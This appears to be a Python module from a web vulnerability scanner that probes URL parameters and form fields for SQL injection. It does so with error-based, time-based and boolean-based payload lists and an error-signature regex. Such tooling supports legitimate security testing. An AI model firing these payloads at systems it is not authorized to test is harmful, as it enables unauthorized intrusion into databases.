"""
SQL Injection scanner — error-based, time-based, boolean-based.
"""
from __future__ import annotations

import asyncio
import re
import time as time_mod
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from scanner.utils import http as http_util

ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT @@version--",
    "1; SELECT SLEEP(0)--",
    "' OR 1=CONVERT(int,@@version)--",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(4)--",                   4),
    ("' AND BENCHMARK(5000000,MD5(1))--",  5),
    ("'; WAITFOR DELAY '0:0:4'--",         4),
    ("' AND (SELECT pg_sleep(4))--",       4),
    ("' AND IF(1=1,SLEEP(4),'a')--",       4),
    ("1' AND SLEEP(4) AND '1'='1",         4),
]

BOOL_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 'a'='a", "' OR 'a'='b"),
]

ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_|mysqlsyntaxerror|valid mysql|npgsql\.|sqlexception|"
    r"microsoft sql|odbc sql|ora-\d{4}|sqlite.*exception|"
    r"db2 sql error|jdbc|quoted string not properly|"
    r"unterminated string|division by zero|pg_",
    re.I,
)


async def scan(session: aiohttp.ClientSession, url: str, forms=None) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)

    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            finding = await _test_param(session, url, parsed, params, param)
            if finding:
                findings.append(finding)

    for (form_url, method, fields) in (forms or []):
        for field in fields:
            finding = await _test_form(session, form_url, method, fields, field)
            if finding:
                findings.append(finding)

    return findings


async def _test_param(session, url, parsed, params, param) -> Optional[Dict]:
    base_val = params[param][0]

    # Error-based
    for payload in ERROR_PAYLOADS:
        tp = {k: v[0] for k, v in params.items()}
        tp[param] = payload
        test_url = parsed._replace(query=urlencode(tp)).geturl()
        resp = await http_util.get(session, test_url, timeout=12)
        if resp is None:
            continue
        try:
            text = await resp.text(errors="ignore")
        except Exception:
            continue
        if ERROR_PATTERNS.search(text):
            return _make(url, param, payload, "error-based", "SQL error pattern in response")

    # Time-based
    for payload, wait in TIME_PAYLOADS:
        tp = {k: v[0] for k, v in params.items()}
        tp[param] = payload
        test_url = parsed._replace(query=urlencode(tp)).geturl()
        t0 = time_mod.monotonic()
        try:
            resp = await asyncio.wait_for(
                session.get(test_url, ssl=False), timeout=wait + 6
            )
            if resp:
                await resp.text(errors="ignore")
        except asyncio.TimeoutError:
            return _make(url, param, payload, "time-based", f"Response delayed >{wait}s")
        except Exception:
            continue
        elapsed = time_mod.monotonic() - t0
        if elapsed >= wait:
            return _make(url, param, payload, "time-based", f"Response took {elapsed:.1f}s")

    # Boolean-based
    for true_pl, false_pl in BOOL_PAYLOADS:
        tp_t = {k: v[0] for k, v in params.items()}
        tp_t[param] = true_pl
        tp_f = {k: v[0] for k, v in params.items()}
        tp_f[param] = false_pl
        r_t = await http_util.get(session, parsed._replace(query=urlencode(tp_t)).geturl(), timeout=12)
        r_f = await http_util.get(session, parsed._replace(query=urlencode(tp_f)).geturl(), timeout=12)
        if r_t and r_f:
            try:
                t1, t2 = await r_t.text(errors="ignore"), await r_f.text(errors="ignore")
                if abs(len(t1) - len(t2)) > max(len(t1), len(t2)) * 0.15:
                    return _make(url, param, true_pl, "boolean-based", "Significant response length difference")
            except Exception:
                pass

    return None


async def _test_form(session, form_url, method, fields, field) -> Optional[Dict]:
    for payload in ERROR_PAYLOADS[:4]:
        data = dict(fields)
        data[field] = payload
        if method == "post":
            resp = await http_util.post(session, form_url, data=data, timeout=12)
        else:
            resp = await http_util.get(session, form_url, params=data, timeout=12)
        if resp is None:
            continue
        try:
            text = await resp.text(errors="ignore")
        except Exception:
            continue
        if ERROR_PATTERNS.search(text):
            return _make(form_url, field, payload, "form/error-based", "SQL error in form response")
    return None


def _make(url, param, payload, context, evidence) -> Dict[str, Any]:
    return {
        "type":      "sqli",
        "severity":  "critical",
        "url":       url,
        "parameter": param,
        "payload":   payload,
        "context":   context,
        "evidence":  evidence,
        "details":   f"SQL injection ({context})",
        "timestamp": time_mod.strftime("%Y-%m-%dT%H:%M:%S"),
    }
